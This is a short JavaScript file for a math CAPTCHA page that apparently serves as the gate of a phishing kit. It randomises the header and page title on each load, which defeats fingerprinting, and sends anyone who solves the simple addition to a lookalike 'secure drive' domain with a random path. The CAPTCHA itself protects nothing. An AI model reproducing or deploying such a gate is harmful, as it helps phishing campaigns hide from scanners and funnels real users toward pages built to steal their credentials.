document.addEventListener("DOMContentLoaded", function() {
    // Array of possible titles for the header
    const titles = [
        "Solve the math problem",
        "Find the solution to the mathematical equation",
        "Determine the answer to the math problem",
        "Solve for the unknown variable in the equation",
        "Calculate the value of the expression",
        "Work out the solution to the mathematical puzzle",
        "Figure out the solution to the equation",
        "Determine the numerical solution to the problem",
        "Compute the result of the mathematical expression",
        "Find the value of the variable in the equation"
    ];

    // Generate a random math question
    function generateCaptcha() {
        var num1 = Math.floor(Math.random() * 10) + 1;
        var num2 = Math.floor(Math.random() * 10) + 1;
        var question = `What is ${num1} + ${num2}?`;
        document.getElementById("captcha-question").textContent = question;
        document.getElementById("captcha-answer").value = num1 + num2;
    }

    // Validate the user's answer
    function validateCaptcha() {
        var userAnswer = parseInt(document.getElementById("captcha-input").value);
        var correctAnswer = parseInt(document.getElementById("captcha-answer").value);

        if (userAnswer === correctAnswer) {
            window.location.href = "https://secure.drive.securymoment.xyz/snHGHPVk";
        } else {
            alert("Incorrect answer. Please try again.");
            generateCaptcha();
        }
    }

    // Set a random header title when the page loads
    const randomHeaderTitle = titles[Math.floor(Math.random() * titles.length)];
    document.querySelector(".captcha-header h2").textContent = randomHeaderTitle;

    // Set a random character string with 5 characters for the <title> element when the page loads
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let randomTitle = '';
    for (let i = 0; i < 5; i++) {
        randomTitle += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    document.title = randomTitle;

    // Call generateCaptcha when the page loads
    generateCaptcha();

    // Attach event listener to the submit button
    document.getElementById("submit-btn").addEventListener("click", validateCaptcha);
});